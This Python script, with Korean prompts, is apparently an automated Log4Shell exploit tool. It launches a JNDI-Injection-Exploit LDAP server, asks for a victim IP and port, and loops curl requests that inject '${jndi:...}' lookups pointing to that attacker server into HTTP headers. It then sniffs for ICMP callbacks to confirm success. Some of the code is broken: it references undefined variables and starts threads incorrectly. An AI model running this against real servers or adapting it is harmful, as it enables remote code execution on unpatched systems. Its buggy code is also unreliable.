import os
import socket
import os.path
import threading
import time
from requests import get
from scapy.all import *

def on_server(ex_ip):
    # 서버 프로세스 확인 후 KILL 코드 추가
    print('[+] 서버 시작\n[+] java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "ping -c 1 ' + ex_ip + '" -A ' + ex_ip)
    try:
        os.system('java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "ping -c 1 ' + ex_ip + '" -A ' + ex_ip)
    except Exception as err:
        print('[@] LDAP 서버가 구동에 실패하였습니다.\n')
        print(err)
        exit(1)

def main(victim_ip, victim_port):
    time.sleep(2)

    header_list = (open("./headerlist.txt", 'r')).readlines()
    for i in range(1, len(header_list)):
        print('\n' + str(i) + "번째 헤더 : " + str(header_list[i]))
    print('\n[+] 전체 헤더 리스트입니다.')
    print('\n[+] 헤더 숫자를 적으면 해당 헤더에 대한 공격을 진행하고, 0을 입력할 경우 전체 리스트를 순차적으로 대입합니다.\n')
    select_header = int(input('Enter : '))
    os.system('clear') #화면 정리용
    print('[+] 선택한 헤더: ' + str(header_list[select_header]))

    server_output = (open("./out.txt", 'r')).readlines()
    list_num = 1
    url_list = ['ALL', ]
    for i in range(len(fl)):
        if 'JDK 1.7' in fl[i]:
            print(str(list_num) + '.JDK 1.7 whose trustURLCodebase is true : ' + server_output[i + 1])
            list_num = list_num + 1
            url_list.append(fl[i + 1])
            print(str(list_num) + '.JDK 1.7 whose trustURLCodebase is true : ' + server_output[i + 2])
            list_num = list_num + 1
            url_list.append(fl[i + 2])
        elif 'JDK 1.8' in fl[i]:
            print(str(list_num) + '.JDK 1.8 whose trustURLCodebase is true : ' + server_output[i + 1])
            list_num = list_num + 1
            url_list.append(fl[i + 1])
            print(str(list_num) + '.JDK 1.8 whose trustURLCodebase is true : ' + server_output[i + 2])
            list_num = list_num + 1
            url_list.append(fl[i + 2])
        elif 'Tomcat' in fl[i]:
            print(str(list_num) + '.JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath : ' + server_output[i + 1])
            list_num = list_num + 1
            url_list.append(fl[i + 1])
    print('\n[+] 전체 서버 주소 리스트입니다.')
    print('\n[+] 숫자를 적으면 해당 서버 주소를 이용해 공격을 진행하고, 0을 입력할 경우 전체 리스트를 순차적으로 대입합니다.\n')
    select_url = int(input('Enter : '))
    os.system('clear') #화면 정리용
    print('[+] 선택한 주소: ' + str(servers[select_url]))

    if (header_list[select_header] == 'ALL') and (url_list[select_url] != 'ALL'):
        for x in range(1, len(header_list)):
            attcurl = "curl " + victim_ip + ":" + victim_port + " -H '" + str(header_list[x]) + ": ${jndi:" + str(url_list[select_url]).replace("\n", "") + "'}"
            print('\n' + attcurl)
            os.system(attcurl)
            time.sleep(0.5)

    elif (header_list[select_header] != 'ALL') and (url_list[select_url] == 'ALL'):
        for y in range(1, len(url_list)):
            attcurl = "curl " + victim_ip + ":" + victim_port + " -H '" + str(header_list[select_header]) + ": ${jndi:" + str(url_list[y]).replace("\n", "") + "'}"
            print('\n' + attcurl)
            os.system(attcurl)
            time.sleep(0.5)

    elif (header_list[select_header] == 'ALL') and (header_list[select_header] == 'ALL'):
        for x in range(1, len(header_list)):
            for y in range(1, len(url_list)):
                attcurl = "curl " + victim_ip + ":" + victim_port + " -H '" + str(header_list[x]) + ": ${jndi:" + str(url_list[y]).replace("\n", "") + "'}"
                print('\n' + attcurl)
                os.system(attcurl)
                time.sleep(0.5)

    else:
        attcurl = "curl " + victim_ip + ":" + victim_port + " -H '" + str(header_list[select_header]) + ": ${jndi:" + str(header_list[select_header]).replace("\n", "") + "'}"
        print(attcurl)
        os.system(attcurl)

def success_check(pkt, ex_ip, victim_ip):
    if pkt.haslayer(ICMP):
        if socket.gethostbyname(socket.gethostname()) == pkt[IP].src:
            #print(str("[") + str(time) + str("]") + "  " + "ICMP-OUT:{}".format(
                #len(pkt[ICMP])) + " Bytes" + "    " + "IP-Version:" + str(
                #pkt[IP].version) + "    " * 1 + " SRC-MAC:" + str(pkt.src) + "    " + "DST-MAC:" + str(
                #pkt.dst) + "    " + "SRC-IP: " + str(pkt[IP].src) + "    " + "DST-IP:  " + str(pkt[IP].dst))
            if (str(pkt[IP].src) == str(victim_ip)) & (str(pkt[IP].dst) == str(ex_ip)):
                print('[+] 공격이 성공하였습니다.')

def scapy_sniff(ex_ip, victim_ip):
    sniff(prn=success_check(ex_ip=ex_ip,victim_ip=victim_ip))

if __name__ == '__main__':
    ex_ip = get("https://api.ipify.org").text
    victim_ip = input('\n[+] 공격을 진행할 서비스의 IP 주소를 작성해주세요.\nEnter : ')
    victim_port = input('\n[+] 공격을 진행할 서비스의 PORT를 작성해주세요.\nEnter : ')
    print('\n[+] 당신의 공격 목표가 ' + victim_ip + ':' + victim_port + '로 설정되었습니다.')
    t1 = threading.Thread(target=on_server(ex_ip))
    t2 = threading.Thread(target=scapy_sniff(ex_ip, victim_ip))
    t1.daemon = True
    t2.daemon = True
    t1.IsBackground = True
    t2.IsBackground = True
    t1.start()
    t2.start()
    main(victim_ip, victim_port)
